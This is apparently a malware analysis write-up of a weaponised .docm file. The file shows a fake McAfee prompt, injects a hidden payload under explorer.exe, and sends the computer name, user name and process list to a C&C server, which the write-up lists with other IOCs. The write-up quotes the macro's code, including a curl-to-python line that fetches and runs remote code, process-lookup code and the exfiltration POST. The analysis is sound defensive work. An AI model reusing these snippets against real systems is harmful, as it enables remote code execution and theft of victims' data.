MSDOC document

MD5: 497b1e7320b5bc585cc2c8159710adb2

### TL;DR:
The user is tricked by a fake McAffee protection that need to be enabled in order to read the document.

Macro inside a fake .docm that create a malicious process (embeded payload) as an explorer.exe child.

This process doesn't have a name and is hiden from the user.

Next, some basic configuration data are extracted to a C&C server: Computer Name, User Name and a list of running process.

The original document's content is then displayed to the user, as if nothing happends.

======================================================

### Extraction

```bash
#python oledump.py macro.docx 
A: word/vbaProject.bin
 A1:       443 'PROJECT'
 A2:        41 'PROJECTwm'
 A3: M   31293 'VBA/ThisDocument'
 A4:      5541 'VBA/_VBA_PROJECT'
 A5:      4947 'VBA/__SRP_0'
 A6:       734 'VBA/__SRP_1'
 A7:      5738 'VBA/__SRP_2'
 A8:      1244 'VBA/__SRP_3'
 A9:       523 'VBA/dir'
```

Only one macro file: 'VBA/ThisDocument'

extract under macro.vba

This macro seems to be polyglot:

```vba
#If Mac Then
Private Sub Document_Open()
    On Error Resume Next
    MacScript "do shell script ""(curl -s " & Read("M") & "?token=" & Read("ID") & "'&'dm | nohup python &>/dev/null &)"""
    ActiveDocument.Bookmarks("Page1").Range.Font.Hidden = False
End Sub

#Else
```

======================================================

### Initial Setup
Macro triggered on 'Document_Open()' callback

Launch an Wscript Shell

Ability to deal with x86 or x86-64 computer

Create a new working directory under %APPDATA% with a random string

```vba
random_num = Int((25678 - (23 - 1)) * Rnd()) + 23
newFolder = Trim(Str(random_num))
[...]
dir2 = Environ("APPDATA") & Read("OD") & "\{" & newFolder & "}"
[...]
MkDir dir1
[...]
MkDir dir2
```

Which resolve, for instance, to : "C:\Users\user\AppData\Roaming\{18914}"

The macro will drop a zip or pckg file later on

======================================================

### Injection
TL;DR: Inject into an "explorer.exe" by creating a suspended process as a hidden window

Search for an explorer.exe process and grab it's PID:

```vba
snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, ByVal 0&)
RProcessFound = Process32First(snapshot, pEntry)

    If Left$(pEntry.szexeFile, Len("explorer.exe")) = LCase$("explorer.exe") Then
        GP = pEntry.th32ProcessID
```

Open a handler to it, and update the wShowWindow attribute to 'SW_HIDE' along with the dwFlags.

If the process create a children, it will inherite thoses attributes (and be invisible to the user)

The children process is created with an empty name: ""

Decode a XML payload and write it to "C:\Users\user\AppData\Roaming\{18914}\<rand>.zip".

Create a new process launching the payload

======================================================

### Exfiltration
Use some WMI requests and the environment variable to gather the computer name and the username:

```vba
Set objWMIService = GetObject("winmgmts:\\" & computer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
("SELECT * FROM Win32_Process")
[...]
result = Environ("ComputerName") & vbNewLine & Environ("UserDomain") & "\" & Environ("Username") & vbNewLine
```

It also gather the list of running process and append it:

Which returns: "DESKTOP-SDV771D DESKTOP-SDV771D\user System Registry csrss.exe winlogon.exe ..."

The string is hex encoded before beeing exfiltrated

The POST requests is made, using some arguments for the exfiltrated data:

```vba
ba = StrConv(Gather(), vbFromUnicode)
objHTTP.send ("&token=" & Read("ID") & "&session=" & EH(ba))
```

The exfiltrated data is hex-encoded before the exfiltration.

The paraeter is, in our case, something like: "session=4445534b544f502d534456373731440d0a4445534b544f502d534456373731445c757365720d0a53797374656d2049646c652050726f636573730d0a53797374656d0d0a52656769737472790d0a736d73732e6578650d0a63737273732e6578650d0a63737273732e6578650d0a77696e696e69742e6578650d0a77696e6"

After the exfiltration, the original document is displayed to the user:

```vba
ActiveDocument.Bookmarks("Page1").Range.Font.Hidden = False
```
======================================================

### IOCs:
* WMI request: "SELECT * FROM Win32_Process"
* C&C IP: "104.160.36.51"
* HTTP POST request with the parameters: 104.160.36.51&token=<id>&session=<hex-encoded-value>
* MSDOC document with the following 'BuiltInDocumentProperties': "OD", "OF", "IU6", "IU3", "M", "ID" and "Hyperlink Base"
    * "OD"  : Name of the sub-folder to write data to
    * "OF"  : Name of the exfiltrated zip/pckg file to write the payload to
    * "IU6" : Hex-encoded content of the x64 payload
    * "IU3" : Hex-encoded content of the x86_x64 payload
    * "M"   : URL or IP address of the C&C server
    * "ID"  : Pseudo 'mutex' to identify a spreaded document
* User-Agent: "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
* Content-Type: "application/x-www-form-urlencoded"
* Folder: "%APPDATA%Roaming\{18914}\" (hardcoded)
* Payload file: "%APPDATA%\Roaming\{18914}\<rand>.zip"
* Extracted Payload 1 MD5: 9ba3d08eb88441a7450ab84596c8a888
* Extracted Payload 2 MD5: 534c93031ce008c47b9e44cd772cd303
* File MEtadata:
    * Author: Nick Landers
    * Last saved as: mal.text
    * Creation date: 10/19/2016 11:11 AM

